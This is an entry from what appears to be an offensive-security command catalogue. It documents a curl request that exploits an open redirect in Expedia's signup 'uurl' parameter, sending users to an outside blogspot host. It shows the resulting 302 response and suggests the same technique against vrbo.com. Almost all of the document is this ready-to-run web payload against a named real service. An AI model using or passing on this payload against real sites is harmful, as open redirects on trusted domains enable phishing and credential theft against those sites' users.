---
id: cmd-curl-signup-redirect
data: >-
  curl -X GET
  "https://www.expedia.com/signup?enable_registration=true&uurl=e3id%3Dredr%26rurl=qx4lw1nsec.blogspot.com@qx4lw1nsec.blogspot.com"
  -v
tags:
  - signup
  - open-redirect
type: command
output: |-
  HTTP/2 302 
  Location: qx4lw1nsec.blogspot.com
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:34.905Z'
verified: false
validated: true
submitted: true
---
# curl-signup-redirect

## Command

```bash
curl -X GET "https://www.expedia.com/signup?enable_registration=true&uurl=e3id%3Dredr%26rurl=qx4lw1nsec.blogspot.com@qx4lw1nsec.blogspot.com" -v
```

## Description

Exploits uurl parameter in Expedia signup for encoded redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | GET method | Yes |
| `-v` | Verbose | Yes |
| `uurl` | Encoded redirect payload | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.expedia.com/signup?enable_registration=true&uurl=e3id%3Dredr%26rurl=qx4lw1nsec.blogspot.com@qx4lw1nsec.blogspot.com" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.vrbo.com/signup?..." -v
```

## Expected Output

302 to decoded malicious URL post-signup simulation.

## Related

- [[Related Procedure: Exploit-Redirect-in-Login-and-Signup]]
